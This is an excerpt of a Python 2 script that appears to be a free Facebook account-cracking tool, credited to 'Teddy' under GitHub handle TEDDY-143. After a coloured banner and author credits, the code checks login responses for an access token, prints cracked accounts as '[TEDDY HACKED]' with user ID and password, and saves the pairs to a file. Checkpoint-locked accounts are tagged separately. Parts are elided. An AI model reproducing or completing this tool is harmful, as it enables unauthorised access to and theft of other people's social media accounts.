...
\033[0;94m    ________________  ______  __
\033[0;94m  /_  __/ ____/   __ \/    __   \ \/ /
\033[0;96m    / /  / /___/ /_/ / /  _/ /     / /  
\033[0;96m  /_/ /_____/_____/_____/  /_/    
\033[0;96m    
""")

print("\033[0;91mThis Tool's Free By Noxi Vai")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Teddy '
    print '\033[0;94mFACEBOOK : Zahidul Islam Ratul '
    print '\033[0;96mGITHUB   : TEDDY-143 '
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TEDDY HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[TEDDY-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
